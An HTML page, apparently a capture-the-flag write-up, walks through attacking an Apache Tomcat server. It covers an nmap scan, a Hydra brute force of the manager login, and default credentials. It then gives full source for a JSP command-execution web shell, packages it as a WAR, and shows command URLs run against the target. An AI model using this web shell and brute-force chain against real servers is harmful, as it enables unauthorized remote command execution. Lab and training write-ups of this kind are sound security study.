@@ -1,0 +1,146 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Tomcat Recon & Exploit</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: monospace;
+      background: #0f0f0f;
+      color: #ccc;
+      line-height: 1.6;
+      padding: 20px;
+    }
+    h1, h2 {
+      color: #00ff88;
+    }
+    pre, code {
+      background: #111;
+      color: #0f0;
+      padding: 10px;
+      border-radius: 8px;
+      overflow-x: auto;
+      display: block;
+      margin: 10px 0;
+    }
+    .section {
+      margin-bottom: 40px;
+    }
+    .highlight {
+      color: #00d4ff;
+    }
+    button {
+      background: #00ff88;
+      color: #000;
+      border: none;
+      padding: 10px 18px;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 14px;
+    }
+    button:hover {
+      background: #00d4ff;
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+
+  <h1>Tomcat Recon & Exploit Walkthrough</h1>
+
+  <div class="section">
+    <h2>Target Information</h2>
+    <pre>IP: 54.177.1.28
+Service: Apache Tomcat</pre>
+  </div>
+
+  <div class="section">
+    <h2>Recon & Enumeration</h2>
+    <p>Started with a full aggressive <span class="highlight">nmap</span> scan:</p>
+    <pre>nmap -sV -sC -sS -f -A -O --script vuln -Pn 54.177.1.28</pre>
+    <p>Discovered:</p>
+    <pre>
+/examples/   - sample scripts available
+/manager/html - Apache Tomcat Manager (401 Unauthorized)
+    </pre>
+  </div>
+
+  <div class="section">
+    <h2>Brute Force Credentials</h2>
+    <p>Ran Hydra to brute force the Tomcat Manager login:</p>
+    <pre>hydra -L users.txt -P passwords.txt http-get://54.177.1.28:8080/manager/html</pre>
+    <p>Found valid credentials:</p>
+    <pre>Username: admin
+Password: tomcat</pre>
+  </div>
+
+  <div class="section">
+    <h2>Deploying JSP Shell</h2>
+    <p>Created project directory:</p>
+    <pre>mkdir -p shell/WEB-INF</pre>
+    <p>Wrote a simple JSP reverse shell:</p>
+    <pre>
+cat > shell/shell.jsp <<'EOF'
+<%@ page import="java.io.*"%>
+<%
+if (request.getParameter("cmd") != null) {
+  String cmd = request.getParameter("cmd");
+  String output = "";
+  try {
+    Process p = Runtime.getRuntime().exec(cmd);
+    BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
+    String line;
+    while ((line = reader.readLine()) != null) { output += line + "\n"; }
+  } catch (Exception e) { output += e.toString(); }
+  out.println("&lt;pre&gt;" + output + "&lt;/pre&gt;");
+}
+%>
+EOF
+    </pre>
+    <p>Created the <code>web.xml</code> descriptor:</p>
+    <pre>
+cat > shell/WEB-INF/web.xml <<'EOF'
+<web-app>
+  <servlet>
+    <servlet-name>shell</servlet-name>
+    <jsp-file>/shell.jsp</jsp-file>
+  </servlet>
+  <servlet-mapping>
+    <servlet-name>shell</servlet-name>
+    <url-pattern>/shell.jsp</url-pattern>
+  </servlet-mapping>
+</web-app>
+EOF
+    </pre>
+    <p>Packaged everything into a WAR file:</p>
+    <pre>jar -cvf shell.war -C shell/ .</pre>
+  </div>
+
+  <div class="section">
+    <h2>Exploitation</h2>
+    <p>Uploaded the <span class="highlight">shell.war</span> using Tomcat Manager and executed commands:</p>
+    <pre>
+http://54.177.1.28:8080/shell/shell.jsp?cmd=whoami
+http://54.177.1.28:8080/shell/shell.jsp?cmd=ipconfig
+http://54.177.1.28:8080/shell/shell.jsp?cmd=dir
+    </pre>
+  </div>
+
+  <div class="section">
+    <h2>Captured Flag</h2>
+    <pre>FLAG{3xp0s3_t0mc@t_@nd_j3rry_w1ll_run_fr0m_y0u}</pre>
+  </div>
+
+  <button onclick="scrollToTop()">Scroll to Top</button>
+
+  <script>
+    function scrollToTop() {
+      window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+  </script>
+
+</body>
+</html>
+
